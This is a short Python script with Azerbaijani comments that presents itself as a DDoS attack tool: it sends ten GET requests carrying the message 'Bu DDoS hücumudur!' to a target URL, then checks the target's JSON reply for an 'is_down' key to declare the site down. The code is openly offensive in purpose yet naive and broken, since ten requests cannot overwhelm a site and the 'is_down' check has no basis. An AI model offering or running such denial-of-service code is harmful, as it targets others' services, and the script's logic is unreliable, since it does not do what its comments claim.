import requests
import json

# Hücum ediləcək veb ünvanı təyin edin
url = "http://www.example.com"

# Göndəriləcək istək sayını təyin edin
num_requests = 10

# Hücum mesajını təyin edin
payload = "Bu DDoS hücumudur!"

# İstəkləri göndərin
for i in range(num_requests):
    requests.get(url, data=payload)

# Cavabı təhlil edin
response = requests.get(url)
json_response = json.loads(response.text)

# Hədəf veb resursu düşmüşsə, bunu yoxlayın
if "is_down" in json_response:
    print("Hədəf resurs düşüb.")
else:
    print("Hədəf resurs işlək.")

